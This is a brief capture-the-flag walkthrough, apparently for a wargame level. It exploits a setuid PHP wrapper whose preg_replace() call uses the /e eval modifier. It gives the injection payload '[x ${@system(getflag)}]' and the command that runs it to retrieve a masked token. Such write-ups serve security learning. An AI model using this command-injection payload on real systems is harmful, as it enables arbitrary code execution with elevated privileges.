# Level06
## Step by step
- In the user `level06` home directory, there is a file
  ```bash
  > ls -la
  -rwsr-x---+ 1 flag06  level06 7503 Aug 30  2015 level06
  -rwxr-x---  1 flag06  level06  356 Mar  5  2016 level06.php
  ```
- The file `level06.php` contains code in PHP. It's calling a function `preg_replace()` that is unsafe with the flag `/*/e`.
  ```bash
  > cat <<'hey' >/tmp/test
  > [x ${@system(getflag)}]
  > hey

  > ./level06 /tmp/test flag06
  Check flag.Here is your token : XXX
  ```
